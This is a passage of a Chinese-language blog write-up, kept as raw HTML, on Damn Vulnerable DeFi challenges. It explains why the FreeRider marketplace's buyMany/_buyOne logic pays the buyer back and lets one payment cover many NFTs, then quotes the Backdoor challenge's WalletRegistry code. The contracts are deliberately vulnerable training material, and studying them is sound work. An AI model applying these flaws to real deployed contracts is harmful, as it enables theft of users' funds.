class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n            <span class=\"token string\">\"Account offering must have approved transfer\"</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        offers<span class=\"token punctuation\">[</span>tokenId<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> price<span class=\"token punctuation\">;</span>\n\n        amountOfOffers<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">NFTOffered</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> price<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">buyMany</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">calldata</span> tokenIds<span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> nonReentrant <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> tokenIds<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">_buyOne</span><span class=\"token punctuation\">(</span>tokenIds<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_buyOne</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>       \n        <span class=\"token builtin\">uint256</span> priceToPay <span class=\"token operator\">=</span> offers<span class=\"token punctuation\">[</span>tokenId<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>priceToPay <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Token is not being offered\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>value <span class=\"token operator\">>=</span> priceToPay<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Amount paid is not enough\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        amountOfOffers<span class=\"token operator\">--</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// transfer from seller to buyer</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// pay seller</span>\n        <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sendValue</span><span class=\"token punctuation\">(</span>priceToPay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">NFTBought</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> priceToPay<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>    \n\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"analyze-9\"><a href=\"#analyze-9\" class=\"headerlink\" title=\"analyze\"></a>analyze</h2><p>在buyone()函数欻存在漏洞。</p>\n<p>我们要先审计token中的erc721合约，该合约下有一个safeTransferFrom方法，进行审计。</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"> <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> tokenId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     * @dev See &#123;IERC721-safeTransferFrom&#125;.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">safeTransferFrom</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _data\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> virtual override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_isApprovedOrOwner</span><span class=\"token punctuation\">(</span><span class=\"token function\">_msgSender</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC721: transfer caller is not owner nor approved\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">_safeTransfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> _data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">//调用了_safeTransfer()函数</span>\n      <span class=\"token keyword\">function</span> <span class=\"token function\">_safeTransfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> tokenId<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">memory</span> _data\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">_checkOnERC721Received</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">,</span> _data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC721: transfer to non ERC721Receiver implementer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    \n    <span class=\"token comment\">//调用了_transfer()函数</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_transfer</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> to<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span> tokenId\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> virtual <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>ERC721<span class=\"token punctuation\">.</span><span class=\"token function\">ownerOf</span><span class=\"token punctuation\">(</span>tokenId<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC721: transfer from incorrect owner\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>to <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"ERC721: transfer to the zero address\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_beforeTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Clear approvals from the previous owner</span>\n        <span class=\"token function\">_approve</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        _balances<span class=\"token punctuation\">[</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">-=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        _balances<span class=\"token punctuation\">[</span>to<span class=\"token punctuation\">]</span> <span class=\"token operator\">+=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        _owners<span class=\"token punctuation\">[</span>tokenId<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> to<span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">emit</span> <span class=\"token function\">Transfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token function\">_afterTokenTransfer</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">from</span><span class=\"token punctuation\">,</span> to<span class=\"token punctuation\">,</span> tokenId<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">//在此处可以发现 _owners[tokenId] = to这句代码，转账之后，token的拥有者发生改变</span>\n<span class=\"token comment\">//发现漏洞，返回初始合约</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>由于在进行了buyone()下的safeTransferFrom之后，token.ownerOf(tokenId)已经变成购买者，所以下一句payable(token.ownerOf(tokenId)).sendValue(priceToPay)相当于将刚刚用来购买nft的eth归还给了购买者。</p>\n<p>再buyone()函数下还存在另一个漏洞，因为再buymany()处事循环调用buyone()函数，然而buyone()函数中使用的 require(msg.value &gt;&#x3D; priceToPay)所以可以在一次循环中用一份的价格购买多个nft。</p>\n<p>所以，借15个eth，开买！</p>\n<h2 id=\"attack-9\"><a href=\"#attack-9\" class=\"headerlink\" title=\"attack\"></a>attack</h2><h1 id=\"11-Backdoor\"><a href=\"#11-Backdoor\" class=\"headerlink\" title=\"11.Backdoor\"></a>11.Backdoor</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：</p>\n<p>To incentivize the creation of more secure wallets in their team, someone has deployed a registry of <a href=\"https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol\">Gnosis Safe wallets</a>. When someone in the team deploys and registers a wallet, they will earn 10 DVT tokens.</p>\n<p>To make sure everything is safe and sound, the registry tightly integrates with the legitimate <a href=\"https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol\">Gnosis Safe Proxy Factory</a>, and has some additional safety checks.</p>\n<p>Currently there are four people registered as beneficiaries: Alice, Bob, Charlie and David. The registry has 40 DVT tokens in balance to be distributed among them.</p>\n<p>Your goal is to take all funds from the registry. In a single transaction.</p></blockquote>\n<h2 id=\"code-6\"><a href=\"#code-6\" class=\"headerlink\" title=\"code\"></a>code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token comment\">// SPDX-License-Identifier: MIT</span>\n<span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.8.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/access/Ownable.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">/**\n * @title WalletRegistry\n * @notice A registry for Gnosis Safe wallets.\n           When known beneficiaries deploy and register their wallets, the registry sends some Damn Valuable Tokens to the wallet.\n * @dev The registry has embedded verifications to ensure only legitimate Gnosis Safe wallets are stored.\n * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)\n */</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">WalletRegistry</span> <span class=\"token keyword\">is</span> IProxyCreationCallback<span class=\"token punctuation\">,</span> Ownable <span class=\"token punctuation\">&#123;</span>\n    \n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> MAX_OWNERS <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> MAX_THRESHOLD <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> <span class=\"token keyword\">constant</span> TOKEN_PAYMENT <span class=\"token operator\">=</span> <span class=\"token number\">10</span> ether<span class=\"token punctuation\">;</span> <span class=\"token comment\">// 10 * 10 ** 18</span>\n    \n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> immutable masterCopy<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> immutable walletFactory<span class=\"token punctuation\">;</span>\n    IERC20 <span class=\"token keyword\">public</span> immutable token<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> beneficiaries<span class=\"token punctuation\">;</span>\n\n    <span class=\"token comment\">// owner => wallet</span>\n    <span class=\"token keyword\">mapping</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> wallets<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span>\n        <span class=\"token builtin\">address</span> masterCopyAddress<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> walletFactoryAddress<span class=\"token punctuation\">,</span> \n        <span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">memory</span> initialBeneficiaries\n    <span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>masterCopyAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>walletFactoryAddress <span class=\"token operator\">!=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        masterCopy <span class=\"token operator\">=</span> masterCopyAddress<span class=\"token punctuation\">;</span>\n        walletFactory <span class=\"token operator\">=</span> walletFactoryAddress<span class=\"token punctuation\">;</span>\n        token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint256</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> initialBeneficiaries<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token function\">addBeneficiary</span><span class=\"token punctuation\">(</span>initialBeneficiaries<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">addBeneficiary</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> beneficiary<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> onlyOwner <span class=\"token punctuation\">&#123;</span>\n        beneficiaries<span class=\"token punctuation\">[</span>beneficiary<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_removeBeneficiary</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> beneficiary<span class=\"token punctuation\">)</span> <span class=\"token keyword\">private</span> <span class=\"token punctuation\">&#123;</span>\n        beneficiaries<span class=\"token punctuation\">[</span>beneficiary<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">/**\n     @notice Function executed when user creates a Gnosis Safe wallet via GnosisSafeProxyFactory::createProxyWithCallback\n             setting the registry's address as the callback.\n     */</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">proxyCreated</span><span class=\"token punctuation\">(</span>\n        GnosisSafeProxy proxy<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">address</span> singleton<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">bytes</span> <span class=\"token keyword\">calldata</span> initializer<span class=\"token punctuation\">,</span>\n        <span class=\"token builtin\">uint256</span>\n    <span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> override <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token comment\">// Make sure we have enough DVT to pay</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> TOKEN_PAYMENT<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Not enough funds to pay\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> walletAddress <span class=\"token operator\">=</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">(</span>proxy<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Ensure correct factory and master copy</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender <span class=\"token operator\">==</span> walletFactory<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Caller must be factory\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>singleton <span class=\"token operator\">==</span> masterCopy<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Fake mastercopy used\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Ensure initial calldata was a call to `GnosisSafe::setup`</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes4</span><span class=\"token punctuation\">(</span>initializer<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> GnosisSafe<span class=\"token punctuation\">.</span>setup<span class=\"token punctuation\">.</span>selector<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Wrong initialization\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Ensure wallet initialization is the expected</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">GnosisSafe</span><span class=\"token punctuation\">(</span>walletAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getThreshold</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> MAX_THRESHOLD<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Invalid threshold\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">GnosisSafe</span><span class=\"token punctuation\">(</span>walletAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOwners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>length <span class=\"token operator\">==</span> MAX_OWNERS<span class=\"token punctuation\">,</span> <span class=\"token string\">\"Invalid number of owners\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       \n\n        <span class=\"token comment\">// Ensure the owner is a registered beneficiary</span>\n        <span class=\"token builtin\">address</span> walletOwner <span class=\"token operator\">=</span> <span class=\"token function\">GnosisSafe</span><span class=\"token punctuation\">(</span>walletAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">getOwners</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>beneficiaries<span class=\"token punctuation\">[</span>walletOwner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Owner is not registered as beneficiary\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Remove owner as beneficiary</span>\n        <span class=\"token function\">_removeBeneficiary</span><span class=\"token punctuation\">(</span>walletOwner<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Register the wallet under the owner's address</span>\n        wallets<span class=\"token punctuation\">[</span>walletOwner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> walletAddress<span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Pay tokens to the newly created wallet</span>\n        token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>walletAddress<span class=\"token punctuation\">,</span> TOKEN_PAYMENT<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>        \n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" 